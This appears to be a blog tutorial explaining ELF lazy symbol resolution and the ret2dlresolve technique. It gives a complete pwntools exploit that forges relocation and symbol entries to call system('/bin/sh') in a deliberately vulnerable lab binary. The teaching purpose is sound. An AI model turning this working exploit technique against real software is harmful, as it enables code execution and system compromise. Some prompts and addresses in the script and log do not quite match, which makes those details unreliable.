# A technical deep-dive into x86_64 Ret2dlResolve

<pre style="font-size: 0.6rem; text-align: center">
                                                                                                                               
                          .   *.#@ **./@@  %                              (%*@  %, %..@ @                     
                        @% *.@..,,,,@@ .# %, .                      @. * #..,,,,....*/**%%                      
                        #/% .@..@@@@@.**##*/ @                      @(@* #,,@@@@....%%/.**                        
                    @#/.........@@....,,..../, #                (   /*....,,,,,,,,,,..../,/#@                     
                @ *@#(........,*.%*../..@@..,,(/                  @.......,,%/(,*(,,........../%                  
                #  /.....,@/,#@.*.#.  ( %@,,....(% (         @,.....@@@. .(@ ...( ( @#(,@@....*(@@                
                 ,@,......* %#,(* @,,@/,#*@,....,%@          @.(....*,..*/.#((  (@@(@#.#@.....*.                  
              @ /@.,..../,.#..  @@@@@@@@/.*@....*,%%        @@*%....*, %  .@@@@@@@@ @. ,((.@,.@@,                 
        .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@  @@@@@@@@@@./ %  @@/*  %%%%, .       
        ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@       
        ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@       
        **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@       
        ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@       
            ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @,             
            @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./,             
            ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@             
            , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@..  @@ (#/..,.#.              
            , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*%              
            ( .*.... *@.,.....@@@@@@.....@@@/#/.....(  %.  (.....,.%........@@@@@@....@@,. # @@.,.%#              
            . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#%              
             @%@....,,(@ ..@..  @@@@@@@@.@.#,,.*/**%.  %@@.@##..,,..   @..  @@@@@@@@@@ #, @,.....%@               
                @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@      #,(@..,**,.@//@@....% @,((((..,,@./@,#                
                @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@      .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/.                
                 # @....,,..%/.,((/(%* @@@@@,,,,.%@@  %%%%  . /,,%@@,@@...%**#.*, /./..,,,,,@.%%                  
                   ,%%....,.,,..........  .,,* /*    %%%%%%%  .@ @#@..,...............,,**(%##                    
                    ,@.*%/.@..........,,...(,#(@@   %%%%%%%%  @@/.#/,((...............,,@*@(                      
                    * ,/. .@........,,,,,,##@#. @   %%%%%%%%  @@.%,, ,(%..............,,#(  @                     
                        @@,@*@*#.*.@,*%#@%.(/%    @ %%%%%%%%%%  .,(,(*#(*  #@ #/%,/ /%@@                          
                        @@@@    ....    **,@      %%%%%%%%%%%%   @ *..%#@@  ..@@..    @@                          
                                        . (,@@@   %%%%%%%%%%%%    @ (.,,(*@.                                      
                                        ,/@@@@@   %%%%%%%%%%%%    @ %#*..( .                                      
                                        %%@ @@.@ %%%%%%%%%%%%%    @@(,.. #.@                                      
                                    ,. %@%  @@@%@ %%%%%%%%%%%%    @@ @,.(/.@                                      
                                    . #(@   @@.@  @ %%%%%%%%    @@@@.%/.%@...                                     
                                    (#/     @@.@  @ %%%%%%%%    @@@@%%@#@.(@(                                     
                                   , *%%        @@  %%%%%%%%        % %%. #%/.@%    @                             
                @@               %% .@.  @@.@  @@.@  %%%%%%  @@     @(%.  %....                                  
             %(,                #%... .%*,@#((%,*# %@@        @@#.,(,# @###@.. *%,%%@@            .               
            .%((                 ...@...@(@  ,,#,#@.@@      @@@@%@*/(@, # ..... (.%%              % *             
             %..*               /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@  @...@... .(             %#(..             
            #@...%(.        @%%/................%# %%..@ %((*##%..................#*@%%%    %%,%.#..*.            
            /%*....@.#     /* .................. .  %#( ,*,# @@@.....................*%%(   %*.......*            
            %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......#              
              @/......................................#@%%%.......................................,%              
                .................................... ./%%%.%(@..................................# ,%              
                ,/ %................................        %................................. //                 
                * %#................................*/    @@% ,%..............................%. /                
                    ............................./%           @(.#............................%                   
                       *//..................,.#.                . (@%%..................** %                      
                        (,,.(%.%%%@..#. #..((%%%                    **@....#.@@..(..,@%*, %%                      
                        @%%%,% @(.%@...%./,%%%%%                    %%.% %/.@.@...@%%%%(%(%%                      
</pre>

## Background theory

### ELFs and symbols

ELFs define executable pieces as symbols. These symbols can later be used by other ELFs.

In order to import symbols, the linker needs to connect these references so those addresses point to the right place. 

There are 2 options here:

1. **Static linking**: the symbols will be resolved at compiled time and embedded into the final binary. 
2. **Dynamic linking**: this technique uses a process of resolving the symbol called relocation. [Lazy binding](https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter3-7.html) (relocation at runtime) happens during the first call of the function through PLT and GOT.

### PLT and GOT

* GOT (Global offset table) contains the actual addresses of the symbols (or the hook to resolve them)
* PLT (Procedural Linking Table) contains short functions that make a call to the proper GOT entry.

### Understanding symbol resolution

The flow that depicts how this happens is presented in the following diagram:

<img src="/./assets/imgs/ret2dlresolve_unresolved.png">

Let's see what's going on with a simple program that calls 2 functions:

```C

#include <stdio.h>
#include <stdlib.h>

int main() {
    char buf[8];
    gets(buf);
    puts(buf);
    return 0;
}
```
Compile with:

`$ gcc test.c -no-pie -o test -fno-stack-protector`

Now, let's fire gdb and see the result:

> I have gef installed, in case the input does not match exactly but you should be able to follow along still!

1. Function `main` calls `gets` and `puts` functions. This is translated as a call to the PLT entry for `gets` `gets@plt` and `puts` `puts@plt`:

    
```asm
    gef➤  disass main
   0x0000000000401163 <+0>:	endbr64
   0x0000000000401167 <+4>:	push   rbp
   0x0000000000401168 <+5>:	mov    rbp,rsp
   0x000000000040116b <+8>:	sub    rsp,0x10
   0x000000000040116f <+12>:	lea    rax,[rip+0xe8e]        # 0x402004
   0x0000000000401176 <+19>:	mov    rdi,rax
   0x0000000000401179 <+22>:	call   0x401050 <puts@plt>
   0x000000000040117e <+27>:	lea    rax,[rbp-0x10]
   0x0000000000401182 <+31>:	mov    rdi,rax
   0x0000000000401185 <+34>:	mov    eax,0x0
   0x000000000040118a <+39>:	call   0x401060 <gets@plt>
   0x000000000040118f <+44>:	lea    rax,[rbp-0x10]
   0x0000000000401193 <+48>:	mov    rdi,rax
   0x0000000000401196 <+51>:	call   0x401050 <puts@plt>
   0x000000000040119b <+56>:	mov    eax,0x0
   0x00000000004011a0 <+61>:	leave
   0x00000000004011a1 <+62>:	ret
```

2. Function `gets@plt` consists of:


```asm
gef➤  disass 0x401060
Dump of assembler code for function gets@plt:
   0x0000000000401060 <+0>: endbr64 
   0x0000000000401064 <+4>: bnd jmp QWORD PTR [rip+0x2fb5]        # 0x404020 <gets@got.plt>
   0x000000000040106b <+11>: nop    DWORD PTR [rax+rax*1+0x0]
```

3. Function `puts@plt` consists of:

```asm
gef➤  disass 0x401050
Dump of assembler code for function puts@plt:
   0x0000000000401050 <+0>: endbr64 
   0x0000000000401054 <+4>: bnd jmp QWORD PTR [rip+0x2fbd]        # 0x404018 <puts@got.plt>
   0x000000000040105b <+11>: nop    DWORD PTR [rax+rax*1+0x0]
```

And where do they come from? Those values come from the PLTREL `.rela.plt`

---
#### PLTREL and Elf64_Rel

The first piece of the puzzle is a structure called [Elf64_Rel](https://llvm.org/doxygen/structllvm_1_1ELF_1_1Elf64__Rel.html).

This structure contains two fields:

`r_offset`: This address points to the GOT address of the symbol.

`r_info`: This value actually represents two different pieces of information.
    
* `symbol (getSymbol function)`: this is used as an index for the list of Elf64_Sym, as in `list_of_elf64_sym[symbol]`
    
* `type (getType function)` we will talk more about this one later, but in our case it should be 7.
   ```
   #define R_X86_64_JUMP_SLOT	7	/* Create PLT entry */
   assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
   #define ELF_MACHINE_JMP_SLOT	R_X86_64_JUMP_SLOT
   ```

> If curious, other relocation types can be found at: `/arch/x86/include/asm/elf.h` in the Linux kernel source code.

We can conveniently retrieve those values with `readelf -r test`
```asm
Relocation section '.rela.plt' at offset 0x500 contains

  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404020  000400000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0
```

or through gdb, first by finding out the location of `.rela.plt` with `info file`:

`0x0000000000400500 - 0x0000000000400530 is .rela.plt`

and then inspecting the memory addresses.

---

4. If we check the memory values of `r_offset` we can see:

```asm
gef➤  x/2wx 0x404020
0x404020 <gets@got.plt>: 0x00401040 0x00000000
gef➤  x/2wx 0x404018
0x404018 <puts@got.plt>: 0x00401030 0x00000000
```

And those point to:

```asm
gef➤  x/3i 0x00401030
   0x401030: endbr64 
   0x401034: push   0x0
   0x401039: bnd jmp 0x401020
gef➤  x/3i 0x00401040
   0x401040: endbr64 
   0x401044: push   0x1
   0x401049: bnd jmp 0x401020
gef➤  x/10i 0x401020
   0x401020: push   QWORD PTR [rip+0x2fe2]        # 0x404008
   0x401026: bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010
gef➤  x/2wx 0x404010
0x404010: 0xf7fd8d30 0x00007fff
gef➤  disass 0x00007ffff7fd8d30
Dump of assembler code for function _dl_runtime_resolve_xsavec:
...
```

So, both of them will push a value, then both will call a final part which will push another value (the same for both) and then call `_dl_runtime_resolve_xsavec`. `_dl_runtime_resolve_xsavec` will later call `_dl_fixup`.

Let's break down what happened here. The code is way longer, but a simplistic view would be:

```c
_dl_fixup(link_map, index) {
    Elf64_Rel *rel_entry = JMPREL[index];
    Elf64_Sym *sym_entry = SYMTAB[rel_entry->getSymbol()];
    char *sym_name = STRTAB + sym_entry->st_name ;
    ...
    void *symbol_address = _dl_lookup_symbol_x(sym_name, link_map, ...);
    // now call the resolved symbol with the right args
}
```

We won't get into `link_map` too much but it contains the information about the loaded libraries.

> Reference for [_dl_fixup](https://github.com/lattera/glibc/blob/master/elf/dl-runtime.c#L61) code.
> Reference for [_dl_runtime_resolve](https://github.com/bminor/glibc/blob/d49cd6a1913da9744b9a0ffbefb3f7958322382e/sysdeps/x86_64/dl-trampoline.h#L37)

Now it's time to talk about the missing pieces Elf64_Sym, SYMTAB and `.dynsym`

---
#### SYMTAB and Elf64_Sym


This structure has multiple fields, but the one we really care about is:

`st_name`: this is the offset (not index) in STRTAB (or `.dynstr`) of the string with the name of the function.

> Reference for [Elf64_Sym](https://llvm.org/doxygen/structllvm_1_1ELF_1_1Elf64__Sym.html)


---

So to recap what happens when `gets` is called:

1. `gets` is called, which actually is `gets@plt`.
2. This plt entry references the address from the Elf64_Rel entry (r_offset).
3. This code pushes the index for the Elf64_Rel.
4. The `link_map` address is pushed.
5. We call _dl_runtime_resolve that gets the Elf64_Rel, gets the Elf64_Sym through the getSymbol(), gets the name of the actual function to be resolved, in our case `gets` and calls `_dl_fixup` to actually resolve the symbol.
6. Finally, before exiting, calls the function with the original arguments.


The final diagram after the symbol is resolved looks like:

<img src="/./assets/imgs/ret2dlresolve_resolved.png">

## Exploit

Now the concept for the exploit is simple. We need to create fake Elf64_Rel and Elf64_Sym entries that contain
the needed pieces to resolve the symbol we want, in our case, `system`. Let's see how we can craft it.

The full exploit is as follows: 

```python
from pwn import *
p = process('./test')
#gdb.attach(p, gdbscript="b *main+61")
elf = ELF('./test')

"""
	0x0000000000400318 - 0x0000000000400334 is .interp
	0x0000000000400338 - 0x0000000000400368 is .note.gnu.property
	0x0000000000400368 - 0x000000000040038c is .note.gnu.build-id
	0x000000000040038c - 0x00000000004003ac is .note.ABI-tag
	0x00000000004003b0 - 0x00000000004003cc is .gnu.hash
	0x00000000004003d0 - 0x0000000000400448 is .dynsym
	0x0000000000400448 - 0x0000000000400495 is .dynstr
	0x0000000000400496 - 0x00000000004004a0 is .gnu.version
	0x00000000004004a0 - 0x00000000004004d0 is .gnu.version_r
	0x00000000004004d0 - 0x0000000000400500 is .rela.dyn
	0x0000000000400500 - 0x0000000000400530 is .rela.plt
	0x0000000000401000 - 0x000000000040101b is .init
	0x0000000000401020 - 0x0000000000401050 is .plt
	0x0000000000401050 - 0x0000000000401070 is .plt.sec
	0x0000000000401070 - 0x0000000000401193 is .text
	0x0000000000401194 - 0x00000000004011a1 is .fini
	0x0000000000402000 - 0x0000000000402004 is .rodata
	0x0000000000402004 - 0x0000000000402040 is .eh_frame_hdr
	0x0000000000402040 - 0x0000000000402104 is .eh_frame
	0x0000000000403df8 - 0x0000000000403e00 is .init_array
	0x0000000000403e00 - 0x0000000000403e08 is .fini_array
	0x0000000000403e08 - 0x0000000000403fd8 is .dynamic
	0x0000000000403fd8 - 0x0000000000403fe8 is .got
	0x0000000000403fe8 - 0x0000000000404010 is .got.plt
	0x0000000000404010 - 0x0000000000404020 is .data
	0x0000000000404020 - 0x0000000000404028 is .bss
"""

elf_load_address_fixup = elf.address - elf.load_addr
ELF64_REL_LIST = elf.dynamic_value_by_tag("DT_JMPREL") + elf_load_address_fixup
ELF64_SYM_LIST =  elf.dynamic_value_by_tag("DT_SYMTAB") + elf_load_address_fixup
FUNCTION_NAMES_LIST = elf.dynamic_value_by_tag("DT_STRTAB") + elf_load_address_fixup
RESOLVER = 0x401020

PIVOTED_STACK = 0x0000000000404f10
FINAL_STACK = 0x0000000000404da0

STRING_ADDRESS = PIVOTED_STACK+0x10
REL_ENTRY_ADDRESS = PIVOTED_STACK+0x30
SYM_ENTRY_ADDRESS = PIVOTED_STACK+0x20

"""
// Relocation entry, without explicit addend.
struct Elf64_Rel {
  Elf64_Addr r_offset; // Location (file byte offset, or program virtual addr).
  Elf64_Xword r_info;  // Symbol table index and type of relocation to apply.
 
  // These accessors and mutators correspond to the ELF64_R_SYM, ELF64_R_TYPE,
  // and ELF64_R_INFO macros defined in the ELF specification:
  Elf64_Word getSymbol() const { return (r_info >> 32); }
  Elf64_Word getType() const { return (Elf64_Word)(r_info & 0xffffffffL); }
  void setSymbol(Elf64_Word s) { setSymbolAndType(s, getType()); }
  void setType(Elf64_Word t) { setSymbolAndType(getSymbol(), t); }
  void setSymbolAndType(Elf64_Word s, Elf64_Word t) {
    r_info = ((Elf64_Xword)s << 32) + (t & 0xffffffffL);
  }
};
"""
fake_rel_entry_offset = p64(elf.got['gets']) # Replace gets
# Calculation would be ELF64_SYM_LIST + index * sizeof(Elf64_Sym), being the size 24
assert((SYM_ENTRY_ADDRESS - ELF64_SYM_LIST) % 24 == 0) # We need to assert the address is divisible by Elf64_Sym size (24)
index = int((SYM_ENTRY_ADDRESS - ELF64_SYM_LIST) / 24)
fake_rel_entry_info = p64((index << 32) | 0x7)
fake_rel_entry = fake_rel_entry_offset + fake_rel_entry_info
rel_offset = REL_ENTRY_ADDRESS - ELF64_REL_LIST

"""
// Symbol table entries for ELF64.
struct Elf64_Sym {
  Elf64_Word st_name;     // Symbol name (index into string table)
};
 
// The size (in bytes) of symbol table entries.
enum {
  SYMENTRY_SIZE64 = 24  // 64-bit symbol entry size.
};
"""

fake_sym_entry = p64(STRING_ADDRESS - FUNCTION_NAMES_LIST) + p64(0x00)

"""
_dl_fixup(link_map, index) {
    Elf64_Rel *rel_entry = JMPREL[index] ;
    Elf64_Sym *sym_entry = SYMTAB[rel_entry->getSymbol()];
    char *sym_name = STRTAB + sym_entry -> st_name ;
    void *symbol_address = _dl_fixup(link_map, sym_name);
    // now call the resolved symbol
    _dl_lookup_symbol_x(arg1, arg2...)
}
"""

# Stack pivot 
p.recvuntil(b'xx')
p.sendline(b'A' * 0x10 + p64(PIVOTED_STACK) + p64(elf.symbols['main'] + 12))
p.info(f'Stack pivoting performed to {hex(PIVOTED_STACK)}')

p.info(f'[*] REL LIST ADDR: {hex(ELF64_REL_LIST)}')
p.info(f'[*] SYM LIST ADDR: {hex(ELF64_SYM_LIST)}')
p.info(f'[*] STR LIST ADDR: {hex(FUNCTION_NAMES_LIST)}')
p.info(f'[*] Setting "system" at {hex(STRING_ADDRESS)}')
p.info(f'[*] Setting El64_Sym at {hex(SYM_ENTRY_ADDRESS)}')
p.info(f'    * String index at: {hex(STRING_ADDRESS - FUNCTION_NAMES_LIST)}')
p.info(f'[*] Setting El64_Rel at {hex(REL_ENTRY_ADDRESS)}')
p.info(f'    * Replacing gets at: {hex(elf.got["gets"])}')
p.info(f"    * Fake index is at: {hex(index)} :: final r_info: {hex((index << 32) | 0x7)}")

p.recvuntil(b'xx')
exploit =  p64(0x00)
exploit += p64(0x00)
exploit += p64(FINAL_STACK) # The resolve functions will use a lot of memory, we need as much room as we can get.
exploit += p64(elf.symbols['main'] + 12)
exploit += b"system\x00\x00"
exploit += p64(0x00)
exploit += fake_sym_entry
exploit += fake_rel_entry 
exploit += b'/bin/sh\x00'
p.sendline(exploit)
p.info('[O] Structures set')

# Set string
p.recvuntil(b'xx')
assert(rel_offset % 24 == 0) # We need to assert the address is divisible by Elf64_Rel size (24)
p.info(f'[*] Launching dl_resolve... with rel at offset {hex(int(rel_offset/24))} - real {hex(rel_offset)}')
p.sendline(p64(0x00) * 2 + p64(PIVOTED_STACK+0x50) + p64(RESOLVER) + p64(int(rel_offset/24)) + p64(elf.symbols['main'] + 12))
p.info(f'Final stack addr at {hex(PIVOTED_STACK+0x50)}')

p.recvuntil(b'xx')
p.info('**************************************************')
p.info('All set; that was a nice ride; here is your shell :)')

p.interactive()
```

but let's break it piece by piece.

### Figure out the locations

For this task, I relied on the approach [from pwntools](https://github.com/Gallopsled/pwntools/blob/db98e5edfb/pwnlib/rop/ret2dlresolve.py#L228C1-L232C90) to resolve the addresses:

```python
elf_load_address_fixup = elf.address - elf.load_addr
ELF64_REL_LIST = elf.dynamic_value_by_tag("DT_JMPREL") + elf_load_address_fixup
ELF64_SYM_LIST =  elf.dynamic_value_by_tag("DT_SYMTAB") + elf_load_address_fixup
FUNCTION_NAMES_LIST = elf.dynamic_value_by_tag("DT_STRTAB") + elf_load_address_fixup
RESOLVER = 0x401020
```

But you can obviously resolve them by hand. Using gef we can debug the program and run `xfiles` to get the offsets.
With regular gdb it can be done with `info files`.

These addresses are needed to calculate the indexes so `_dl_resolve` can resolve our fake structures.

Based on this, we will place our structures in a rw controlled area: .data + .bss:

```python
PIVOTED_STACK = 0x0000000000404f10
FINAL_STACK = 0x0000000000404da0

STRING_ADDRESS = PIVOTED_STACK+0x10
REL_ENTRY_ADDRESS = PIVOTED_STACK+0x30
SYM_ENTRY_ADDRESS = PIVOTED_STACK+0x20
```

### Prepare fake Elf64_Rel entry

For the fake Elf64_Rel we need to provide:

 * The entry on the GOT table we want to replace with our function address, in our case, `gets` but it could be any address. 
   We will talk later about why to replace an existing function.

 * The index of our fake Elf64_Sym. Also, we need to set the type to 7 (R_X86_64_JUMP_SLOT)

Finally, we need to calculate the index that we need to provide `_dl_resolve` so it points to this fake Elf64_Rel structure.


```python
fake_rel_entry_offset = p64(elf.got['gets']) # Replace gets
# Calculation would be ELF64_SYM_LIST + index * sizeof(Elf64_Sym), being the size 24
assert((SYM_ENTRY_ADDRESS - ELF64_SYM_LIST) % 24 == 0) # We need to assert the address is divisible by Elf64_Sym size (24)
index = int((SYM_ENTRY_ADDRESS - ELF64_SYM_LIST) / 24)
fake_rel_entry_info = p64((index << 32) | 0x7)
fake_rel_entry = fake_rel_entry_offset + fake_rel_entry_info
rel_offset = REL_ENTRY_ADDRESS - ELF64_REL_LIST
...
rel_offset = int(rel_offset / 24)
```

### Prepare fake Elf64_Sym entry

The Elf64_Sym is simpler. All we need to set is the offset of our string `system`.

`fake_sym_entry = p64(STRING_ADDRESS - FUNCTION_NAMES_LIST) + p64(0x00)`

### Launching dl_resolve

Now that we are ready, let's send the exploit.

1. Pivot the stack to where we are placing all the structures.

```python
p.recvuntil(b'xx')
p.sendline(b'A' * 0x10 + p64(PIVOTED_STACK) + p64(elf.symbols['main'] + 12))
p.info(f'Stack pivoting performed to {hex(PIVOTED_STACK)}')
```

2. Send the structures alongside with the string.

```python
p.recvuntil(b'xx')
exploit =  p64(0x00)
exploit += p64(0x00)
exploit += p64(FINAL_STACK) # The resolve functions will use a lot of memory, we need as much room as we can get.
exploit += p64(elf.symbols['main'] + 12)
exploit += b"system\x00\x00"
exploit += p64(0x00)
exploit += fake_sym_entry
exploit += fake_rel_entry 
exploit += b'/bin/sh\x00'
p.sendline(exploit)
p.info('[O] Structures set')
```

As you can see, we are also placing `/bin/sh` at the end, we will explain why in the next step.

3. Call _dl_resolve with the index pointing to our fake El64_Rel structure.

```python
p.recvuntil(b'xx')
assert(rel_offset % 24 == 0) # We need to assert the address is divisible by Elf64_Rel size (24)
p.info(f'[*] Launching dl_resolve... with rel at offset {hex(int(rel_offset/24))} - real {hex(rel_offset)}')
p.sendline(p64(0x00) * 2 + p64(PIVOTED_STACK+0x50) + p64(RESOLVER) + p64(int(rel_offset/24)) + p64(elf.symbols['main'] + 12))
p.info(f'Final stack addr at {hex(PIVOTED_STACK+0x50)}')
```

### Triggering our new resolved function

So you probably realized at this point that there is no more code after this. We simply jump in main again and it... works?

The reason it works is because, if you remember, we set Elf64_Rel entry to point to `gets`. This means when `gets` is executed
later on again it won't call `gets` but `system`.

```python
   0x000000000040117e <+27>:	lea    rax,[rbp-0x10]
   0x0000000000401182 <+31>:	mov    rdi,rax
   0x0000000000401185 <+34>:	mov    eax,0x0
```

All we need to do is to set rbp-0x10 to our `/bin/sh` call and our shell is popped. That's the reason why the last stack needs to be
set exactly +0x10 from where we left `/bin/sh`.

> Note that `_dl_resolve` will call the resolve function when resolved. We could have simply put `/bin/sh` in `rdi` and it would
> have worked too but in our case that gadget did not exist so we had to take this route. Note that this other approach is
> what pwntools aims to do when using their `ret2dlresolve`.

```bash
[+] Starting local process './test': pid 20091
[*] '/home/litios/ret2libc/test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Stack pivoting performed to 0x404f10
[*] [*] REL LIST ADDR: 0x400500
[*] [*] SYM LIST ADDR: 0x4003d0
[*] [*] STR LIST ADDR: 0x400448
[*] [*] Setting "system" at 0x404f20
[*] [*] Setting El64_Sym at 0x404f30
[*]     * String index at: 0x4ad8
[*] [*] Setting El64_Rel at 0x404f40
[*]     * Replacing gets at: 0x404008
[*]     * Fake index is at: 0x324 :: final r_info: 0x32400000007
[*] [O] Structures set
[*] [*] Launching dl_resolve... with rel at offset 0x318 - real 0x4a40
[*] Final stack addr at 0x404f60
[*] **************************************************
[*] All set; that was a nice ride; here is your shell :)
[*] Switching to interactive mode

$ whoami
litios
```

> Feel free to reach out if you spot any mistakes!

**Happy hacking!**
